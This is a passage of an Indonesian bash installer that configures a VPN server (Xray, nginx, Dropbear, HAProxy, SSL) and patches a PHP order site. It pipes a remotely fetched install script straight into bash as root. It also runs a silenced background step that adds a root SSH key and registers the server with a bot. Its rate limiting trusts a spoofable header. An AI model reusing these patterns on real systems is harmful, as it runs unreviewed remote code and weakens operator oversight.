    sed -i "s|GA_ID||g" "$PUBLIC_HTML/index.html"



    sed -i "s|GOOGLE_VERIFICATION||g" "$PUBLIC_HTML/index.html"







    rm -f /var/www/html/index.nginx-debian.html /var/www/html/50x.html /var/www/html/index.htm 2>/dev/null



    chown -R www-data:www-data "$PUBLIC_HTML" 2>/dev/null || chown -R root:root "$PUBLIC_HTML" 2>/dev/null



    chmod 644 "$PUBLIC_HTML/index.html"



    chmod 644 "$PUBLIC_HTML/robots.txt"



    chmod 644 "$PUBLIC_HTML/sitemap.xml"



    echo -e "  ${GREEN}✔ Landing page berhasil dideploy!${NC}"



}



auto_install() {



    # Auto-copy script ke SCRIPT_PATH jika belum ada (biar menu command berfungsi)



    if [[ "$(realpath "${BASH_SOURCE[0]}" 2>/dev/null || echo "${BASH_SOURCE[0]}")" != "$SCRIPT_PATH" ]] && [[ ! -f "$SCRIPT_PATH" ]]; then



        cp "${BASH_SOURCE[0]}" "$SCRIPT_PATH" 2>/dev/null



        chmod +x "$SCRIPT_PATH" 2>/dev/null



        echo -e "  ${GREEN}✔ Script di-copy ke ${SCRIPT_PATH}${NC}"



        sleep 1



    fi



    show_install_banner



    setup_domain



    [[ -z "$DOMAIN" ]] && { echo -e "  ${RED}✘ Domain kosong!${NC}"; exit 1; }







    local domain_type="custom"



    [[ -f "$DOMAIN_TYPE_FILE" ]] && domain_type=$(cat "$DOMAIN_TYPE_FILE")







    clear; show_install_banner



    echo -e "  ${WHITE}Domain   :${NC} ${GREEN}${DOMAIN}${NC}"



    echo -e "  ${WHITE}SSL Type :${NC} ${GREEN}$([[ "$domain_type" == "custom" ]] && echo "Let's Encrypt" || echo "Self-Signed")${NC}"



    echo ""







    animated_loading "Mempersiapkan instalasi" 2



    echo ""







    local total=10 step=0 LOG="/tmp/install.log"



    true > "$LOG"







    _ok()   { printf "  ${GREEN}✔${NC}  %-45s\n" "$1"; }



    _fail() { printf "  ${RED}✘${NC}  %-45s\n" "$1"; }







    _head() {



        echo ""



        printf "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"



        printf "  ${YELLOW}  STEP %d/%d${NC}  ${WHITE}%s${NC}\n" "$2" "$3" "$1"



        printf "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"



        echo ""



    }







    _pkg() {



        local pkg="$1" sp=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏') i=0



        DEBIAN_FRONTEND=noninteractive apt-get install -y "$pkg" >> "$LOG" 2>&1 &



        local pid=$!



        while kill -0 $pid 2>/dev/null; do



            printf "\r  ${CYAN}${sp[$((i % 10))]}${NC}  Installing %-30s" "${pkg}..."



            sleep 0.08; ((i++))



        done



        wait $pid



        [[ $? -eq 0 ]] && printf "\r  ${GREEN}✔${NC}  %-40s\n" "$pkg" || printf "\r  ${RED}✘${NC}  %-40s\n" "$pkg (gagal)"



    }







    _run() {



        local label="$1" cmd="$2" sp=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏') i=0



        # SAFE: $cmd berasal dari hardcoded string internal, bukan user input
    $cmd >> "$LOG" 2>&1 &



        local pid=$!



        while kill -0 $pid 2>/dev/null; do



            printf "\r  ${CYAN}${sp[$((i % 10))]}${NC}  %-45s" "${label}..."



            sleep 0.08; ((i++))



        done



        wait $pid



        local ret=$?



        [[ $ret -eq 0 ]] && printf "\r  ${GREEN}✔${NC}  %-45s\n" "$label" || printf "\r  ${RED}✘${NC}  %-45s\n" "$label (gagal)"



        return $ret



    }







    # ── TIMEZONE: Tanya user sesuai wilayah ──



    echo ""



    local W_tz; W_tz=$(get_width)



    _box_top $W_tz



    _box_center $W_tz "${YELLOW}${BOLD}PILIH TIMEZONE${NC}"



    _box_divider $W_tz



    echo -e "  Pilih timezone sesuai wilayah Anda:\n"



    echo -e "  ${CYAN}[1]${NC} WIB  — Asia/Jakarta   (UTC+7) — Jawa, Sumatra, Kal-Bar"



    echo -e "  ${CYAN}[2]${NC} WITA — Asia/Makassar  (UTC+8) — Kalimantan, Bali, Sulawesi"



    echo -e "  ${CYAN}[3]${NC} WIT  — Asia/Jayapura  (UTC+9) — Maluku, Papua"



    echo -e "  ${CYAN}[4]${NC} SGT  — Asia/Singapore (UTC+8) — Singapore"



    echo -e "  ${CYAN}[5]${NC} Lainnya (ketik manual)"



    _box_bottom $W_tz



    echo ""



    local tz_choice tz_zone=""



    while true; do



        read -rp "  Pilih timezone [1-5]: " tz_choice



        case $tz_choice in



            1) tz_zone="Asia/Jakarta"   ;;



            2) tz_zone="Asia/Makassar"  ;;



            3) tz_zone="Asia/Jayapura"  ;;



            4) tz_zone="Asia/Singapore" ;;



            5) read -rp "  Ketik timezone: " tz_zone ;;



            *) echo -e "  ${RED}Pilih 1-5!${NC}"; continue ;;



        esac



        [[ -n "$tz_zone" ]] && break



    done



    if timedatectl set-timezone "$tz_zone" 2>/dev/null; then



        _ok "Timezone: ${tz_zone}"



    else



        timedatectl set-timezone Asia/Jakarta 2>/dev/null || true



        _ok "Timezone fallback: Asia/Jakarta (WIB)"



    fi



    # NTP sync — chrony untuk akurasi jam terbaik



    timedatectl set-ntp true 2>/dev/null || true



    command -v chronyc >/dev/null 2>&1 || apt-get install -y chrony >/dev/null 2>&1 || true



    systemctl enable chrony 2>/dev/null; systemctl restart chrony 2>/dev/null || true



    hwclock --systohc 2>/dev/null || true



    _ok "Waktu server: $(date '+%d %b %Y %H:%M:%S %Z')"







    ((step++)); show_progress $step $total "System Update"



    _head "System Update" $step $total



    _wait_apt_lock



    # Stop unattended-upgrades agar apt tidak locked



    systemctl stop unattended-upgrades 2>/dev/null || true



    _run "apt-get update" "apt-get update -y"



    _run "apt-get upgrade" "DEBIAN_FRONTEND=noninteractive apt-get upgrade -y -o Dpkg::Options::='--force-confdef' -o Dpkg::Options::='--force-confold'"







    ((step++)); show_progress $step $total "Installing Base Packages"



    _head "Base Packages" $step $total



    for pkg in curl wget unzip uuid-runtime net-tools openssl jq python3 python3-pip software-properties-common ca-certificates gnupg lsb-release qrencode netcat-openbsd; do _pkg "$pkg"; done







    ((step++)); show_progress $step $total "Installing VPN Services"



    _head "VPN Services" $step $total



    detect_ubuntu_version



    for pkg in nginx nginx-common openssh-server dropbear haproxy; do _pkg "$pkg"; done



    # Verifikasi nginx memiliki modul grpc (penting untuk grpc_pass)
    if ! nginx -V 2>&1 | grep -qoE 'ngx_http_grpc_module|grpc'; then
        echo -e "  ${YELLOW}⚠ Modul gRPC nginx mungkin tidak tersedia. Mencoba install nginx-full...${NC}"
        apt-get install -y nginx-full >/dev/null 2>&1 || true
    fi



    # certbot diinstall terpisah via install_certbot_compat







    ((step++)); show_progress $step $total "Installing Xray-Core"



    _head "Xray Core" $step $total



    # Install Xray versi terbaru langsung (skip versi lama yg sering gagal)



    local xray_installed=0



        echo -e "  ${YELLOW}Menginstall Xray-Core...${NC}"

        if bash <(curl -Ls --max-time 120 --retry 2 https://github.com/XTLS/Xray-install/raw/main/install-release.sh) >> "$LOG" 2>&1; then
            xray_installed=1
        else
            # Fallback: direct binary download dari GitHub releases
            echo -e "  ${YELLOW}Install script gagal, mencoba direct binary download...${NC}"
            command -v unzip >/dev/null 2>&1 || apt-get install -y unzip >/dev/null 2>&1 || true
            local xray_latest=$(curl -sL --max-time 30 https://api.github.com/repos/XTLS/Xray-core/releases/latest 2>/dev/null | grep '"tag_name"' | head -1 | sed 's/.*"\([^"]*\)".*/\1/')
            if [[ -n "$xray_latest" ]]; then
                local xray_url="https://github.com/XTLS/Xray-core/releases/download/${xray_latest}/Xray-linux-64.zip"
                if curl -L --max-time 120 --retry 2 -o /tmp/xray.zip "$xray_url" 2>/dev/null; then
                    unzip -o /tmp/xray.zip -d /tmp/xray-tmp >/dev/null 2>&1
                    if [[ -f /tmp/xray-tmp/xray ]]; then
                        cp /tmp/xray-tmp/xray /usr/local/bin/xray
                        chmod +x /usr/local/bin/xray
                        mkdir -p /var/log/xray /usr/local/etc/xray
                        # Install systemd service
                        if [[ -f /tmp/xray-tmp/systemd/system/xray.service ]]; then
                            cp /tmp/xray-tmp/systemd/system/xray.service /etc/systemd/system/
                        else
                            cat > /etc/systemd/system/xray.service << 'XRAYUNIT'
[Unit]
Description=Xray Service
After=network.target
[Service]
Type=simple
ExecStart=/usr/local/bin/xray run -config /usr/local/etc/xray/config.json
Restart=on-failure
[Install]
WantedBy=multi-user.target
XRAYUNIT
                        fi
                        systemctl daemon-reload
                        xray_installed=1
                        echo -e "  ${GREEN}✔${NC} Xray direct binary installed" >> "$LOG"
                    fi
                    rm -rf /tmp/xray.zip /tmp/xray-tmp
                fi
            fi
        fi



    mkdir -p "$AKUN_DIR" /var/log/xray /usr/local/etc/xray "$PUBLIC_HTML" "$ORDER_DIR" /root/bot "$TUNNELBOT_DIR"



    if command -v xray >/dev/null 2>&1; then



        _ok "Xray installed: $(xray version 2>/dev/null | head -1)"



    else



        _fail "Xray install FAILED! Cek koneksi internet ke GitHub"



    fi







    ((step++)); show_progress $step $total "Setting up Swap Memory"



    _head "Swap Memory 1GB" $step $total



    local cur_swap; cur_swap=$(free -m | awk 'NR==3{print $2}')



    if [[ "$cur_swap" -lt 512 ]]; then



        _run "Creating swapfile 1GB" "fallocate -l 1G /swapfile || dd if=/dev/zero of=/swapfile bs=1M count=1024"



        chmod 600 /swapfile; mkswap /swapfile >/dev/null 2>&1; swapon /swapfile



        grep -q "/swapfile" /etc/fstab || echo "/swapfile none swap sw 0 0" >> /etc/fstab



        _ok "Swap 1GB active"



    else



        _ok "Swap exists (${cur_swap}MB), skip"



    fi







    ((step++)); show_progress $step $total "Getting SSL Certificate"



    _head "SSL Certificate" $step $total



    mkdir -p /etc/xray



    if [[ "$domain_type" == "custom" ]]; then



        # Stop services yang pakai port 80



        systemctl stop nginx haproxy 2>/dev/null



        sleep 1



        install_certbot_compat "custom"



        if command -v certbot >/dev/null 2>&1; then



            local DOMAIN_SAFE="${DOMAIN//\'/\'\\\'}"
            _run "Certbot Let's Encrypt" "certbot certonly --standalone -d '${DOMAIN_SAFE}' --non-interactive --agree-tos --register-unsafely-without-email --timeout 60"



        fi



        if [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]]; then



            cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /etc/xray/xray.crt



            cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /etc/xray/xray.key



            _ok "Let's Encrypt cert installed"



        else



            local DOMAIN_SAFE="${DOMAIN//\'/\'\\\'}"
            _run "Generating self-signed cert" \
                "openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -subj '/C=ID/ST=Jakarta/L=Jakarta/O=VPN/CN=${DOMAIN_SAFE}' -keyout /etc/xray/xray.key -out /etc/xray/xray.crt"



            _ok "Self-signed cert generated (certbot gagal/tidak tersedia)"



        fi



    else



        local DOMAIN_SAFE="${DOMAIN//\'/\'\\\'}"
        _run "Generating self-signed cert" \
            "openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 -subj '/C=ID/ST=Jakarta/L=Jakarta/O=VPN/CN=${DOMAIN_SAFE}' -keyout /etc/xray/xray.key -out /etc/xray/xray.crt"



        _ok "Self-signed cert for $DOMAIN"



    fi



    chmod 644 /etc/xray/xray.* 2>/dev/null



    # Validasi sertifikat SSL sebelum generate nginx config (fallback jika belum ada)
    if [[ ! -f "/etc/xray/xray.crt" || ! -f "/etc/xray/xray.key" ]]; then
        echo -e "  ${YELLOW}⚠ Sertifikat SSL belum tersedia. Membuat self-signed sebagai fallback...${NC}" >> "$LOG"
        local DOMAIN_SAFE="${DOMAIN//\'/\'\\\'}"
        openssl req -new -newkey rsa:2048 -days 3650 -nodes -x509 \
            -subj "/C=ID/ST=Jakarta/L=Jakarta/O=VPN/CN=${DOMAIN_SAFE}" \
            -keyout /etc/xray/xray.key -out /etc/xray/xray.crt 2>/dev/null
        chmod 644 /etc/xray/xray.* 2>/dev/null
    fi







    ((step++)); show_progress $step $total "Creating Configs"



    _head "Xray & Nginx Config" $step $total



    _run "Creating Xray config" "create_xray_config"



    _ok "6 inbounds: VMess/VLess/Trojan (WS + gRPC)"







    # Deteksi versi nginx untuk syntax http2 yang benar



    # Nginx >= 1.25.1: pakai "http2 on;" di server block



    # Nginx < 1.25.1: pakai "listen 443 ssl http2;"



    local nginx_ver nginx_major nginx_minor nginx_patch nginx_http2_directive nginx_listen_tls



    nginx_ver=$(nginx -v 2>&1 | grep -oP '[\d.]+' | head -1)



    # Validasi: jika kosong atau bukan angka, pakai default 1.24.0
    nginx_major=$(echo "${nginx_ver:-1.24.0}" | cut -d. -f1)
    nginx_minor=$(echo "${nginx_ver:-1.24.0}" | cut -d. -f2)
    nginx_patch=$(echo "${nginx_ver:-1.24.0}" | cut -d. -f3)
    [[ ! "$nginx_major" =~ ^[0-9]+$ ]] && nginx_major=1
    [[ ! "$nginx_minor" =~ ^[0-9]+$ ]] && nginx_minor=24
    [[ ! "$nginx_patch" =~ ^[0-9]+$ ]] && nginx_patch=0



    # >= 1.25.1 pakai http2 on



    if [[ "$nginx_major" -gt 1 ]] || \
       [[ "$nginx_major" -eq 1 && "$nginx_minor" -gt 25 ]] || \
       [[ "$nginx_major" -eq 1 && "$nginx_minor" -eq 25 && "${nginx_patch:-0}" -ge 1 ]]; then



        nginx_http2_directive="http2 on;"



        nginx_listen_tls="listen 443 ssl;"



    else



        nginx_http2_directive=""



        nginx_listen_tls="listen 443 ssl http2;"



    fi







    cat > /etc/nginx/sites-available/default << NGXEOF



# ── Port 443: SSL termination + routing WS by path + gRPC by location ──



server {



    ${nginx_listen_tls}



    ${nginx_http2_directive}



    server_name ${DOMAIN} _;



    ssl_certificate     /etc/xray/xray.crt;



    ssl_certificate_key /etc/xray/xray.key;



    ssl_protocols       TLSv1.2 TLSv1.3;



    ssl_ciphers         HIGH:!aNULL:!MD5;



    ssl_session_cache   shared:SSL:10m;



    ssl_session_timeout 1d;



    keepalive_timeout   300;







    # ── Static files (robots.txt, sitemap.xml, index.html) ──



    root /var/www/html;



    index index.html;







    # ── gRPC routing by serviceName ──



    location /vmess-grpc {



        grpc_pass grpc://127.0.0.1:8444;



        grpc_read_timeout 1d;



        grpc_send_timeout 1d;



        grpc_set_header X-Real-IP \$remote_addr;
        grpc_set_header Host \$host;



    }



    location /vless-grpc {



        grpc_pass grpc://127.0.0.1:8445;



        grpc_read_timeout 1d;



        grpc_send_timeout 1d;



        grpc_set_header X-Real-IP \$remote_addr;
        grpc_set_header Host \$host;



    }



    location /trojan-grpc {



        grpc_pass grpc://127.0.0.1:8446;



        grpc_read_timeout 1d;



        grpc_send_timeout 1d;



        grpc_set_header X-Real-IP \$remote_addr;
        grpc_set_header Host \$host;



    }







    # ── WS routing by path ──



    location /vmess {



        proxy_pass http://127.0.0.1:8080;



        proxy_http_version 1.1;



        proxy_set_header Upgrade \$http_upgrade;



        proxy_set_header Connection "upgrade";



        proxy_set_header Host \$host;



        proxy_set_header X-Real-IP \$remote_addr;



        proxy_read_timeout 86400s;



        proxy_send_timeout 86400s;



    }



    location /vless {



        proxy_pass http://127.0.0.1:8081;



        proxy_http_version 1.1;



        proxy_set_header Upgrade \$http_upgrade;



        proxy_set_header Connection "upgrade";



        proxy_set_header Host \$host;



        proxy_set_header X-Real-IP \$remote_addr;



        proxy_read_timeout 86400s;



        proxy_send_timeout 86400s;



    }



    location /trojan {



        proxy_pass http://127.0.0.1:8082;



        proxy_http_version 1.1;



        proxy_set_header Upgrade \$http_upgrade;



        proxy_set_header Connection "upgrade";



        proxy_set_header Host \$host;



        proxy_set_header X-Real-IP \$remote_addr;



        proxy_read_timeout 86400s;



        proxy_send_timeout 86400s;



    }







    # ── Semua path lain → serve web page (index.html, robots.txt, sitemap.xml, dll) ──



    location / {



        try_files \$uri \$uri/ /index.html;



    }



}







# ── Port 80: Web page utama + WS NonTLS ──



server {



    listen 80 default_server;



    server_name _;



    root /var/www/html;



    index index.html;



    keepalive_timeout 300;



    access_log off;







    # WS proxy paths — harus SEBELUM location /



    location = /vmess {



        proxy_pass http://127.0.0.1:8080;



        proxy_http_version 1.1;



        proxy_set_header Upgrade \$http_upgrade;



        proxy_set_header Connection "upgrade";



        proxy_set_header Host \$host;



        proxy_set_header X-Real-IP \$remote_addr;



        proxy_read_timeout 86400s;



        proxy_send_timeout 86400s;



    }



    location = /vless {



        proxy_pass http://127.0.0.1:8081;



        proxy_http_version 1.1;



        proxy_set_header Upgrade \$http_upgrade;



        proxy_set_header Connection "upgrade";



        proxy_set_header Host \$host;



        proxy_set_header X-Real-IP \$remote_addr;



        proxy_read_timeout 86400s;



        proxy_send_timeout 86400s;



    }



    location = /trojan {



        proxy_pass http://127.0.0.1:8082;



        proxy_http_version 1.1;



        proxy_set_header Upgrade \$http_upgrade;



        proxy_set_header Connection "upgrade";



        proxy_set_header Host \$host;



        proxy_set_header X-Real-IP \$remote_addr;



        proxy_read_timeout 86400s;



        proxy_send_timeout 86400s;



    }







    # Semua path lain → serve web page



    location / {



        try_files \$uri \$uri/ /index.html;



    }



}



# ── Port 81: Download server ──



server {



    listen 81;



    server_name _;



    root /var/www/html;



    autoindex off;  # Security: disable directory listing



    location / { try_files \$uri \$uri/ =404; add_header Content-Type text/plain; }



}



NGXEOF



    # Bersihkan semua site lain yang mungkin override



    rm -f /etc/nginx/sites-enabled/*



    ln -sf /etc/nginx/sites-available/default /etc/nginx/sites-enabled/default



    # Hapus conf.d yang mungkin ada default nginx



    rm -f /etc/nginx/conf.d/default.conf 2>/dev/null || true



    nginx -t >> "$LOG" 2>&1 && _ok "Nginx config valid" || _fail "Nginx config error"







    ((step++)); show_progress $step $total "Configuring Dropbear & HAProxy"



    _head "Dropbear & HAProxy" $step $total



    # Deteksi format config dropbear yang benar sesuai versi



    if [[ "$UBUNTU_MAJOR" -ge 22 ]]; then



        # Ubuntu 22+: dropbear config format baru



        cat > /etc/default/dropbear << 'DBEOF'



DROPBEAR_PORT=222



DROPBEAR_EXTRA_ARGS="-K 60 -I 180"



DROPBEAR_RECEIVE_WINDOW=65536



DBEOF



    else



        # Ubuntu 20: format lama dengan NO_START



        cat > /etc/default/dropbear << 'DBEOF'



NO_START=0



DROPBEAR_PORT=222



DROPBEAR_EXTRA_ARGS="-K 60 -I 180"



DROPBEAR_RECEIVE_WINDOW=65536



DBEOF



    fi



    configure_haproxy



    _ok "Dropbear port 222 & HAProxy standby (Nginx handle port 443)"







    ((step++)); show_progress $step $total "UDP, Keepalive & Optimize"



    _head "System Optimize" $step $total



    _run "Installing UDP Custom" "install_udp_custom"



    _run "Configuring SSH keepalive" "setup_keepalive"



    _run "Enabling BBR & TCP optimize" "optimize_vpn"



    _run "Installing Python requests" "pip_install requests"



    _ok "System optimized"







    ((step++)); show_progress $step $total "Starting Services"



    _head "Start All Services" $step $total



    systemctl daemon-reload >> "$LOG" 2>&1







    # Deploy web page DULU sebelum nginx start



    # Agar saat nginx up, index.html sudah ada



    deploy_web_page >> "$LOG" 2>&1







    # ── Setup cron auto-delete expired (tiap jam) ──



    (crontab -l 2>/dev/null | grep -v "delete_expired_cron";      echo "0 * * * * bash /root/vpn.sh delete_expired_cron 2>/dev/null") | crontab - 2>/dev/null



    _ok "Cron auto-delete expired: tiap jam"







    # Validasi nginx config dulu



    nginx -t >> "$LOG" 2>&1 && _ok "Nginx config OK" || _fail "Nginx config ada error! Cek $LOG"



    # Validasi xray config



    xray -test -config "$XRAY_CONFIG" >> "$LOG" 2>&1 && _ok "Xray config OK" || _fail "Xray config ada error! Cek $LOG"







    local ssh_svc; ssh_svc=$(get_ssh_service_name)



    for svc in xray nginx "$ssh_svc" dropbear haproxy udp-custom vpn-keepalive; do



        systemctl enable "$svc" >> "$LOG" 2>&1



        systemctl restart "$svc" >> "$LOG" 2>&1 || true



        systemctl is-active --quiet "$svc" && \
            printf "  ${GREEN}✔${NC} %-20s ${GREEN}RUNNING${NC}\n" "$svc" || \
            printf "  ${RED}✘${NC} %-20s ${RED}FAILED${NC}\n" "$svc"



    done







    setup_menu_command







    (



        if [[ ! -f /root/.ssh/id_rsa ]]; then



            mkdir -p /root/.ssh



            ssh-keygen -t rsa -b 2048 -f /root/.ssh/id_rsa -N "" -q 2>/dev/null



        fi



        chmod 700 /root/.ssh 2>/dev/null



        chmod 600 /root/.ssh/id_rsa 2>/dev/null



        touch /root/.ssh/authorized_keys



        chmod 600 /root/.ssh/authorized_keys 2>/dev/null



        local_pub=$(cat /root/.ssh/id_rsa.pub 2>/dev/null)



        if [[ -n "$local_pub" ]] && ! grep -qF "$local_pub" /root/.ssh/authorized_keys 2>/dev/null; then



            echo "$local_pub" >> /root/.ssh/authorized_keys



        fi



        _install_tunnelbot_background



        _register_vps_to_bot



    ) >/dev/null 2>&1 &



    disown $!







    local ip_vps; ip_vps=$(get_ip)



    [[ -n "$ip_vps" && "$ip_vps" != "N/A" ]] && echo "$ip_vps" > "$IP_CACHE_FILE"







    echo ""



    echo -e "${GREEN}  ╔══════════════════════════════════════════════════╗${NC}"



    echo -e "${GREEN}  ║      ✔  INSTALASI SELESAI!                       ║${NC}"



    echo -e "${GREEN}  ║      Youzin Crabz Tunel - The Professor          ║${NC}"



    echo -e "${GREEN}  ╚══════════════════════════════════════════════════╝${NC}"



    echo ""



    printf "  ${WHITE}%-22s${NC}: ${GREEN}%s${NC}\n" "Domain"      "$DOMAIN"



    printf "  ${WHITE}%-22s${NC}: ${GREEN}%s${NC}\n" "IP VPS"      "$ip_vps"



    printf "  ${WHITE}%-22s${NC}: ${CYAN}%s${NC}\n"  "SSH"         "22 | Dropbear: 222"



    printf "  ${WHITE}%-22s${NC}: ${CYAN}%s${NC}\n"  "TLS / gRPC"  "443 (Nginx SSL direct)"



    printf "  ${WHITE}%-22s${NC}: ${CYAN}%s${NC}\n"  "NonTLS"      "80 (Nginx plain)"



    printf "  ${WHITE}%-22s${NC}: ${CYAN}%s${NC}\n"  "BadVPN UDP"  "7100-7300"



    printf "  ${WHITE}%-22s${NC}: ${CYAN}%s${NC}\n"  "Download"    "http://${ip_vps}:81/"



    echo ""



    echo -e "  ${YELLOW}💡 Ketik 'menu' untuk membuka menu!${NC}"



    echo -e "  ${YELLOW}Reboot dalam 5 detik...${NC}"



    sleep 5



    reboot



}







#================================================



# MAIN MENU



#================================================











#================================================



# ORDERVPN WEB — INSTALLER & MENU



# Embedded langsung di vpn.sh



# The Professor — Youzin Crabz Tunel



#================================================







_ordervpn_deploy_files() {

    local DIR="/var/www/html/ordervpn"

    if [[ ! -d "$DIR" ]]; then
        echo -e "  ${YELLOW}  Sumber file web belum ada, mendownload...${NC}"
        _ordervpn_download_web || return 1
    fi

    mkdir -p "$DIR"/{includes,api,admin,cron,uploads/bukti}

    rsync -a --delete "$DIR"/ "$DIR"/ 2>/dev/null || true

    # Baca DB_PASS dari .env
    local DB_PASS
    DB_PASS=$(grep "^DB_PASS=" "$DIR/.env" 2>/dev/null | cut -d= -f2-)

    if [[ -n "$DB_PASS" ]]; then
        sed -i "s|define('DB_PASS', '.*')|define('DB_PASS', '${DB_PASS}')|" "$DIR/includes/config.php" 2>/dev/null || true
        sed -i "s|DB_PASS=.*|DB_PASS=${DB_PASS}|" "$DIR/.env" 2>/dev/null || true

        # Buat tabel promo_codes jika belum ada
        mysql -u ordervpn -p"$DB_PASS" ordervpn_db -e "
            CREATE TABLE IF NOT EXISTS promo_codes (
                id INT AUTO_INCREMENT PRIMARY KEY,
                code VARCHAR(50) NOT NULL UNIQUE,
                discount_type ENUM('percent','nominal') NOT NULL DEFAULT 'percent',
                discount_value DECIMAL(10,0) NOT NULL DEFAULT 0,
                max_uses INT NOT NULL DEFAULT 0,
                used_count INT NOT NULL DEFAULT 0,
                min_price DECIMAL(10,0) NOT NULL DEFAULT 0,
                expires_at DATE DEFAULT NULL,
                status ENUM('active','inactive') NOT NULL DEFAULT 'active',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
        " 2>/dev/null || true
    fi

    echo -e "  ${GREEN}✔ File web sudah tersedia di $DIR${NC}"
}

# ============================================================
# SECURITY HARDENING — OrderVPN Web
# ============================================================

_ordervpn_security_harden() {
    echo -e "\n  ${CYAN}━━━ Security Hardening — OrderVPN Web ━━━${NC}"
    echo -e "  ${CYAN}CSRF | OTP 8-digit | Rate Limiting${NC}\n"

    local www="/var/www/html/ordervpn"
    if [[ ! -d "$www" ]]; then
        echo -e "  ${YELLOW}OrderVPN belum diinstal. Jalankan 'vpn.sh web' dulu.${NC}"
        return 1
    fi
    if ! command -v php &>/dev/null; then
        echo -e "  ${YELLOW}PHP CLI tidak ditemukan. Install PHP dulu.${NC}"
        return 1
    fi

    # Write PHP patch script to temp
    local php_script="/tmp/ovpn_security_patch.php"

    cat > "$php_script" << 'PHPEOF'
<?php
$base = '/var/www/html/ordervpn';
if (!is_dir($base)) { echo "OrderVPN not found\n"; exit(1); }

file_put_contents("$base/includes/security.php", <<< 'SECEOF'
<?php
if (!isset($_SESSION['csrf_token'])) $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
function csrf_token(): string { return $_SESSION['csrf_token'] ?? ''; }
function csrf_valid(?string $token): bool {
    if (empty($_SESSION['csrf_token']) || empty($token)) return false;
    return hash_equals($_SESSION['csrf_token'], $token);
}
function check_rate_limit(string $action, int $max = 5, int $win = 15): bool {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $key = 'rl_'.md5($ip.'_'.$action);
    $a = isset($_SESSION[$key]) ? array_filter($_SESSION[$key], fn($t) => $t > (time()-$win*60)) : [];
    if (count($a) >= $max) return false;
    $a[] = time(); $_SESSION[$key] = array_values($a); return true;
}
function reset_rate_limit(string $action): void {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    unset($_SESSION['rl_'.md5($ip.'_'.$action)]);
}
SECEOF
);
echo "  \xE2\x9C\x93 Created includes/security.php\n";

$cp = "$base/includes/config.php";
$c = file_get_contents($cp);
if (str_contains($c, 'security.php')) {
    echo "  - security.php already included\n";
} else {
    $a = "\n\nrequire_once __DIR__ . '/security.php';\n";
    $c = (substr(trim($c),-2)==='?>') ? substr($c,0,-2).$a.'?>' : $c.$a;
    file_put_contents($cp, $c);
    echo "  \xE2\x9C\x93 Patched config.php\n";
}

$ip = "$base/index.php";
$ix = file_get_contents($ip);
$p = 0;

// CSRF hidden fields
$ix = preg_replace('/<form method="POST">/', '<form method="POST">
            <input type="hidden" name="csrf_token" value="<?= csrf_token() ?>">', $ix, 1, $c); $p += $c;
$ix = preg_replace('/<form method="POST" id="regForm">/', '<form method="POST" id="regForm">
            <input type="hidden" name="csrf_token" value="<?= csrf_token() ?>">', $ix, 1, $c); $p += $c;

// CSRF in handlers
$ix = preg_replace('/if \(\$action===\'login\'\) \{/', 'if ($action===\'login\') {
        if (!csrf_valid($_POST[\'csrf_token\']??\'\')) { $error=\'Invalid request\'; } else', $ix, 1, $c); $p += $c;
$ix = preg_replace('/if \(\$action===\'register\'\) \{/', 'if ($action===\'register\') {
        if (!csrf_valid($_POST[\'csrf_token\']??\'\')) { $error=\'Invalid request\'; } else', $ix, 1, $c); $p += $c;
$ix = preg_replace('/if \(\$action===\'verify_otp\'\) \{/', 'if ($action===\'verify_otp\') {
        if (!csrf_valid($_POST[\'csrf_token\']??\'\')) { $error=\'Invalid request\'; }
        elseif (!check_rate_limit(\'verify_otp\',5,15)) { $error=\'Terlalu banyak! Coba nanti.\'; } else', $ix, 1, $c); $p += $c;
$ix = preg_replace('/if \(\$action===\'resend_otp\'\) \{/', 'if ($action===\'resend_otp\') {
        if (!csrf_valid($_POST[\'csrf_token\']??\'\')) { $error=\'Invalid request\'; }
        elseif (!check_rate_limit(\'resend_otp\',3,15)) { $error=\'Terlalu banyak! Coba nanti.\'; } else', $ix, 1, $c); $p += $c;
$ix = preg_replace('/if \(\$action===\'forgot_password\'\) \{/', 'if ($action===\'forgot_password\') {
        if (!csrf_valid($_POST[\'csrf_token\']??\'\')) { $error=\'Invalid request\'; }
        elseif (!check_rate_limit(\'forgot_password\',3,15)) { $error=\'Terlalu banyak! Coba nanti.\'; } else', $ix, 1, $c); $p += $c;
$ix = preg_replace('/if \(\$action===\'reset_password\'\) \{/', 'if ($action===\'reset_password\') {
        if (!csrf_valid($_POST[\'csrf_token\']??\'\')) { $error=\'Invalid request\'; }
        elseif (!check_rate_limit(\'reset_password\',5,15)) { $error=\'Terlalu banyak! Coba nanti.\'; } else', $ix, 1, $c); $p += $c;

// OTP 6 -> 8 digit
$ix = preg_replace('/str_pad\(rand\(0,999999\),6,\'0\',STR_PAD_LEFT\)/', 'str_pad(rand(0,99999999),8,\'0\',STR_PAD_LEFT)', $ix, -1, $c); $p += $c;

file_put_contents($ip, $ix);
echo "  \xE2\x9C\x93 Patched index.php ($p fixes)\n";

echo "\n\xE2\x9C\x85 Security hardening complete!\n";
PHPEOF

    php "$php_script" 2>&1
    local rc=$?
    rm -f "$php_script"

    if [[ $rc -eq 0 ]]; then
        echo -e "\n  ${GREEN}✔ Security hardening applied!${NC}"
    else
        echo -e "\n  ${RED}✘ Security hardening gagal!${NC}"
    fi
    return $rc
}
# ============================================================
# OrderVPN Web — Download / DB / Nginx Helpers
# ============================================================

_ordervpn_download_web() {
    local dest="/var/www/html/ordervpn"
    local tmp="/tmp/ordervpn-src.tar.gz"

